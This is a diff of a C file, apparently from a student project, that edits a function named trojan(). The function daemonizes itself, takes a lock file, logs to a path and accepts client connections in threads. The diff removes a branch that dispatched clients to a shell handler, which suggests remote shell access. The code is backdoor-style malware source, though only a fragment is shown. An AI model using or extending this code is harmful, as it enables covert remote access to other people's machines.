@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/01 15:20:54 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/13 14:37:58 by hivian           ###   ########.fr       */
+/*   Updated: 2017/07/17 17:08:40 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -46,6 +46,7 @@ static int		check_nb_client(char *str, t_thread_params *params, t_env *e)
 		return (0);
 	}
 }
+
 static void		loop(t_env *e)
 {
 	t_thread_params params;
@@ -54,9 +55,6 @@ static void		loop(t_env *e)
 
 	params.logs = e->f_logs;
 	params.total_connection = 0;
-	params.shell_on = false;
-	params.stdout_save = dup(STDOUT_FILENO);
-	params.stderr_save = dup(STDERR_FILENO);
 	while (1)
 	{
 		pthread_t thread;
@@ -74,18 +72,10 @@ static void		loop(t_env *e)
 		params.cli_port = e->client_port;
 		if (!check_nb_client(str, &params, e))
 			continue;
-		if (params.shell_on == false) {
-			if (pthread_create(&thread, &thread_attr, thread_handler, &params) < 0)
-	        {
-				print_logs(e->f_logs, "Could not create thread.");
-	            continue;
-	        }
-		} else {
-			if (pthread_create(&thread, &thread_attr, shell_handler, &params) < 0)
-	        {
-				print_logs(e->f_logs, "Could not create thread.");
-	            continue;
-	        }
+		if (pthread_create(&thread, &thread_attr, thread_handler, &params) < 0)
+	    {
+			print_logs(e->f_logs, "Could not create thread.");
+			continue;
 		}
 	}
 }
@@ -102,7 +92,7 @@ void			trojan(t_env *e)
 	}
 	if (process_id > 0)
 		exit(EXIT_SUCCESS);
-	umask(027);
+	umask(022);
 	sid = setsid();
 	if(sid < 0)
 	{
@@ -110,6 +100,8 @@ void			trojan(t_env *e)
 	}
 	chdir("/");
 	close(STDIN_FILENO);
+	close(STDOUT_FILENO);
+	close(STDERR_FILENO);
 	if ((e->f_logs = fopen(LOG_PATH, "w+")) == NULL)
 		exit(1);
 	lock_file(e);
